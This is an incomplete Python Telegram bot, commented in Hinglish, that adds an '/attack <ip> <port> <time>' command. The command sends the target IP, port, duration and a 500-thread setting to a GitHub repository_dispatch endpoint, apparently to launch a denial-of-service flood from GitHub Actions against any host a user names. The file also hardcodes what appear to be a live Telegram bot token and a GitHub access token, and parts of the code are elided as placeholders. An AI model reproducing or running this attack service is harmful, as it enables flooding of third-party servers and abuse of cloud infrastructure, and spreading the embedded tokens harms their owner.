import os
import telebot
import logging
import requests  # GitHub API ke liye zaruri hai
import threading
import json
from datetime import datetime, timedelta

# ============================================
# CONFIGURATION (Yahan apni details bharein)
# ============================================
TOKEN = '8245702919:AAEtubkBb-vYwdPhSjquf6VscxZVb_ypeUI'
ADMIN_IDS = [954990872]

# GitHub Details (Step 3 wala Token yahan daalein)
GITHUB_TOKEN = "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"
REPO_OWNER = "bgmiwalajaat0-dotcom"
REPO_NAME = "Bb"

bot = telebot.TeleBot(TOKEN)

# ... (Baki saare Data Structures aur File Handling functions wahi rahenge jo tumne diye the) ...
# [Note: Beech ka purana code (load/save/helper functions) yahan include rahega]

# ============================================
# MODIFIED ATTACK COMMAND
# ============================================

@bot.message_handler(commands=['attack'])
def attack_command(message):
    global attack_counter
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    # 1. Basic Approvals & Cooldown Checks (Same as your code)
    if not is_approved(user_id):
        bot.reply_to(message, "❌ *Access Denied!*", parse_mode="Markdown")
        return

    # ... (Cooldown aur Slots waali checking yahan purani hi rahegi) ...

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "✅ Usage: `/attack <ip> <port> <time>`", parse_mode="Markdown")
            return
        
        ip, port, time_val = args
        duration = int(time_val)

        # --- GITHUB TRIGGER LOGIC (Naya Part) ---
        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/dispatches"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }
        payload = {
            "event_type": "run_attack", # attack.yml ki 'types' se match hona chahiye
            "client_payload": {
                "ip": ip,
                "port": port,
                "time": str(duration),
                "thread": "500" # Threads default 500 set kar diye
            }
        }

        # Railway se GitHub ko request bhej rahe hain
        response = requests.post(url, headers=headers, json=payload)

        if response.status_code == 204:
            # Attack Record Update (Internal tracking ke liye)
            with attack_lock:
                attack_counter += 1
                end_time = datetime.now() + timedelta(seconds=duration)
                active_attacks[attack_counter] = {
                    'user_id': user_id,
                    'username': username,
                    'target': f"{ip}:{port}",
                    'end_time': end_time
                }

            bot.reply_to(
                message,
                f"🚀 *Attack Sent to GitHub Cloud!*\n\n"
                f"🎯 *Target:* `{ip}:{port}`\n"
                f"⏰ *Duration:* `{duration}s`\n"
                f"👤 *By:* @{username}\n\n"
                f"🟢 *Status:* GitHub Action Triggered successfully."
            , parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ *GitHub Error:* {response.status_code}\nCheck your Token or Repo Name.")

    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* {str(e)}")

# ============================================
# RUNNING THE BOT
# ============================================
if __name__ == "__main__":
    logging.info("Bot is starting...")
    bot.polling(none_stop=True)
    